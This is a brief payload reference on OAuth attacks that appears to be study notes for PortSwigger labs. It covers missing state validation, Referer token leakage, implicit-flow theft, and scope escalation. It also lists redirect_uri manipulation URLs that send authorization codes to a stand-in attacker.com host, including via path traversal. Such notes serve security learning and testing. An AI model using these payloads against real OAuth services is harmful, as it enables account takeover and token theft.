# OAuth Attacks - Payload Reference

## Missing State Parameter
```
# If OAuth flow doesn't validate state parameter:
# 1. Attacker initiates OAuth flow
# 2. Gets authorization code
# 3. Victim clicks link with attacker's code
# 4. Code gets linked to victim's account
# 5. Attacker accesses victim's account
```

## Token Leakage via Referrer
```
# If OAuth tokens in URL:
# 1. Attacker posts image on forum: <img src="https://target.com/callback?token=xxx">
# 2. When victim views post, token sent in Referer header
# 3. Attacker captures token from server logs
```

## Implicit Flow Token Theft
```
# Implicit flow returns token in URL fragment (#)
# If JavaScript on page reads fragment and sends to server:
# Attacker can inject JS to steal token
```

## redirect_uri Manipulation
```
# If redirect_uri not validated:
https://target.com/oauth?redirect_uri=https://attacker.com/callback

# Path traversal in redirect_uri:
https://target.com/oauth?redirect_uri=https://target.com/../../attacker/callback
```

## Scope Escalation
```
# If scope not validated:
https://target.com/oauth?scope=admin
https://target.com/oauth?scope=read+write+admin
```

## PortSwigger Lab Approach
1. Intercept OAuth flow in Burp
2. Check state parameter validation
3. Test redirect_uri manipulation
4. Test scope escalation
5. Check for token leakage in URLs
